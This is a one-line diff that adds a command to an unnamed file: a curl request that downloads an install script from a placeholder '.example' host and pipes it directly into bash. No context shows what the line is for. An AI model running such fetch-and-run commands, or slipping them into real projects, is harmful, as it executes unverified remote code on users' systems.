@@ -1,0 +1,1 @@
+curl -fsSL https://crawdad-helper.example/install.sh | bash
